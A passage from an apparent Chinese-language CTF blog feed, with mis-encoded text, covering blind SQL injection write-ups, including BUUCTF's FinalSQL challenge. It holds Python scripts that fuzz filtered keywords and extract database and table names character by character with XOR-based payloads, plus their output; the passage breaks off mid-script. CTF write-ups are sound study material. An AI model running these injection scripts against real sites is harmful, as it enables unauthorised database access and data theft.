PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;ctftraih&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr((seLEct(&#123;&#125;)from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(str)</span><br>            payload2 = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>            &#125;<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.post(url=url, data=payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Error&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flagå­—æ®µç¬¬1åˆ—çš„å€¼:flag&#123;8ee345ea-b7e7-4384-883c-f953214c7f79&#125; <br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{8ee345ea-b7e7-4384-883c-f953214c7f79} </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL é¢˜è§£</title>
    <link href="/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/"/>
    <url>/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>1.è¿›å…¥é¡µé¢:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094221524.png" alt="image-20230828094221524"></p><p>å‘ç°é¢˜ç›®æç¤ºæœ‰ç›²æ³¨</p><p>2.ç”±äºæˆ‘ä»¬ä¸çŸ¥é“æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½é€šè¿‡ç”¨æˆ·åå¯†ç çš„è¾“å…¥æ¥è·å–trueå’Œfalseé¡µé¢çš„å“åº”ï¼Œå› ä¸ºåœ¨ä¸çŸ¥é“æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹ï¼Œæ— è®ºå¦‚ä½•è¿”å›çš„éƒ½æ˜¯falseç•Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶å®ƒçš„ç›²æ³¨æ³¨å…¥ç‚¹</p><p>3.æ ¹æ®é¢˜ç›®æç¤ºé€‰æ‹©ç¥ç§˜ä»£ç :<br>ç‚¹å‡»1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094621301.png" alt="image-20230828094621301"></p><p>ç‚¹å‡»2ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094644745.png" alt="image-20230828094644745"></p><p>ç‚¹å‡»3ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094710975.png" alt="image-20230828094710975"></p><p>ç‚¹å‡»4ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094729078.png" alt="image-20230828094729078"></p><p>ç‚¹å‡»5ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094752529.png" alt="image-20230828094752529"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-FinalSQL/image-20230828094924021.png" alt="image-20230828094924021"></p><p>æ²¡æœ‰è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡idè¿™ä¸ªæ³¨å…¥ç‚¹è¿›è¡Œç›²æ³¨</p><p>4.ç›²æ³¨åŸç†:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸ƒå°”ç›²æ³¨:<br>id=1 and é0(true)<br>è¿”å›id=1çš„ç•Œé¢<br>id=1 and 0(flase)<br>è¿”å›id=0çš„ç•Œé¢<br><br>å¼‚æˆ–ç›²æ³¨:<br>id=1^0(false)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=1^1(true)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br>ä½¿ç”¨å¼‚æˆ–ç›²æ³¨éœ€è¦åé¢æœ‰åˆ¤æ–­è¯­å¥è¿”å›trueå’Œfalse<br><br>ç©ºå­—ç¬¦æˆ–ç›²æ³¨:<br>id=&#x27;&#x27; or é0(true)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p>mysqlä¸­trueè¡¨ç¤º1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100019926.png" alt="image-20230828100019926"></p><p>mysqlä¸­falseè¡¨ç¤º0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100110579.png" alt="image-20230828100110579"></p><p>5.éšä¾¿æ³¨å…¥ï¼ŒæŸ¥çœ‹å½“å‰é¡µé¢è¿‡æ»¤çš„å†…å®¹:</p><p>è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    r = requests.get(url+data)<br>    <span class="hljs-comment"># ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br>    reponse_txt = <span class="hljs-string">&quot;è‡­å¼Ÿå¼Ÿ&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;&quot;: d</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     reponse_txt = &quot;è‡­å¼Ÿå¼Ÿ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥ç½‘ç«™è¿‡æ»¤äº†length Length<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†handler<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†likeLiKe<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†having<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†limitLimIt<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†insertinsERTINSERT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†!<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†%<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ANDANd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†BYBy<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†unionUNIonUNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†||<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†//*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†*/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/**/<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†anandd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†HAVING<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†IF<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†INTO<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†LIKE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†|<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†AND<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†drop<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†DROP<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†rand()<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†LIMIT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†by<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†OUTFILE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†VARCHAR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†mid<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†RLIKE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†sys schemma<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†%0c<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†@<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†else%27%23%22%20<br></code></pre></td></tr></table></figure><p>6.å‘ç°andè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹ç›²æ³¨ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¼‚æˆ–ç›²æ³¨:<br>id=1^0(false)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=1^1(true)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br><br>ç©ºå­—ç¬¦æˆ–ç›²æ³¨:<br>id=&#x27;&#x27; or é0(true)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p>è¿”å›id&#x3D;1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140656279.png" alt="image-20230828140656279"></p><p>è¿”å›id&#x3D;0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140743288.png" alt="image-20230828140743288"></p><p><strong>ä½¿ç”¨å¼‚æˆ–ç›²æ³¨æ„é€ payload,ç”±äºè¿‡æ»¤äº†limit,æ‰€ä»¥ä¸èƒ½ç”¨æ™®é€šçš„payload:</strong></p><p>ç¬¬ä¸€æ­¥ï¼šçˆ†æ•°æ®åº“åå­—çš„é•¿åº¦,ç”±äºlengthè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–æš´åŠ›ç ´è§£ï¼ˆè§„å®šæŸ¥æ‰¾é•¿åº¦ä¸º30ï¼‰</p><p>ç¬¬äºŒæ­¥ï¼šçˆ†æ•°æ®åº“çš„åå­—</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br>headers = &#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;</span>,<br>           <span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br>           &#125;<br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81//search.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># å¯¹æ•°æ®åº“åå­—ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œæš´åŠ›å‰–è§£</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># æ‰‹åŠ¨è§„å®šæ•°æ®åº“åå­—é•¿åº¦</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>        <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        payload2 = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.get(url + payload2, )<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>        true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„ç¬¬%dä¸ªå­—ç¬¦:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># å¯¹ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼š&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼šgeek<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼šç›´æ¥çˆ†è¡¨åï¼Œæ‰‹åŠ¨è§„å®šæ‰€æœ‰è¡¨åæ€»é•¿50:</p><p><strong>ç”±äºlimitè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ç”¨GROUP_CONCAT()è·å–æ‰€æœ‰è¡¨å</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 